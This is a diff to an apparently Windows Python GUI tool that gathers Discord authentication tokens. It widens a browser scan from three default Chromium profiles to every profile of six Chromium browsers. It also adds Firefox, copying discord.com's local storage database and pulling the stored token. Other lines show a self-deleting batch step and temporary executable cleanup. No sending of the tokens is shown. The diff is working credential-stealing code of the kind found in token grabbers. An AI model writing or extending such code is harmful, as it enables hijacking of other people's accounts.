@@ -1,4 +1,4 @@
-import webview,threading,os,re,base64,json,asyncio,win32crypt,requests,subprocess,sys
+import webview,threading,os,re,base64,json,asyncio,win32crypt,requests,subprocess,sys,sqlite3,shutil,tempfile
 from curl_cffi import requests as req
 from Crypto.Cipher import AES
 token = None
@@ -122,28 +122,71 @@ del "%~f0"
         if os.path.exists(temp_exe_path):
             os.remove(temp_exe_path)
 def find_browser_tokens():
-    paths = {
-        "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb"),
-        "Edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb"),
-        "Brave": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"),
+    chromium_paths = {
+        "Chromium": os.path.expandvars(r"%LOCALAPPDATA%\Chromium\User Data"),
+        "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
+        "Edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
+        "Brave": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
+        "Opera": os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable"),
+        "Vivaldi": os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\User Data"),
+    }
+    gecko_paths = {
+        "Firefox": os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles"),
+        "Firefox MSIX": os.path.expandvars(r"%LOCALAPPDATA%\Packages\Mozilla.Firefox_n80bbvh6b1yt2\LocalCache\Roaming\Mozilla\Firefox\Profiles"),
     }
     Browser=False
     found = []
-    for b, path in paths.items():
+    for b, path in chromium_paths.items():
         if not os.path.exists(path):
             continue
         Browser = True
-        for file in os.listdir(path):
-            if not file.endswith((".ldb", ".log")):
-                continue
-            try:
-                with open(os.path.join(path, file), "rb") as f:
-                    content = f.read().decode("utf-8", errors="ignore")
-                    for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}", content):
-                      if t not in found:
-                        found.append(t)
-            except:
-                continue
+        for folder in os.listdir(path):
+            if folder == "Default" or folder.startswith("Profile "):
+                leveldb_path = os.path.join(path, folder, "Local Storage", "leveldb")
+                if not os.path.exists(leveldb_path):
+                    continue
+                for file in os.listdir(leveldb_path):
+                    if not file.endswith((".ldb", ".log")):
+                        continue
+                    try:
+                        with open(os.path.join(leveldb_path, file), "rb") as f:
+                            content = f.read().decode("utf-8", errors="ignore")
+                            for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}", content):
+                                if t not in found:
+                                    found.append(t)
+                    except:
+                        continue
+    for b,profile_root in gecko_paths.items():
+        if not os.path.exists(profile_root):
+            continue
+        Browser = True
+        for root, dirs, files in os.walk(profile_root):
+            for file in files:
+                if not file.endswith((".sqlite")):
+                    continue
+                if file == "data.sqlite" and "https+++discord.com" in root:
+                    db_path = os.path.join(root, file)
+                    tmp = os.path.join(tempfile.gettempdir(), f"temp_{os.urandom(4).hex()}.sqlite")
+                    try:
+                        tmp = tempfile.mktemp(suffix=".sqlite")
+                        shutil.copy2(db_path, tmp)
+                        conn = sqlite3.connect(tmp)
+                        cursor = conn.cursor()
+                        cursor.execute("SELECT value FROM data WHERE key='token';")
+                        row = cursor.fetchone()
+                        if row:
+                            token_raw = row[0]
+                            if isinstance(token_raw, bytes):
+                                token = token_raw.decode('utf-8', errors='ignore')
+                            else:
+                                token = str(token_raw)
+                            token = token.strip('"')
+                            if token and token not in found:
+                                found.append(token)
+                        conn.close()
+                    except Exception as e:
+                        print(f"Error reading Firefox data: {e}")
+                        continue
     if not Browser:
         window.evaluate_js("document.getElementById('status').textContent = '✗ Compatiable browser is not installed'; document.getElementById('status').style.color = '#ed4245';")
         return None
@@ -323,7 +366,7 @@ def GetToken():
     if DetectEdge():
         gui = "edgechromium"
     else:
-        print("Unable to find Microsoft Edge Runtime, using QT")
+        print("Unable to find Microsoft Edge Webview2, using QT")
         gui = "qt"
     def on_closed():
         if token is None:
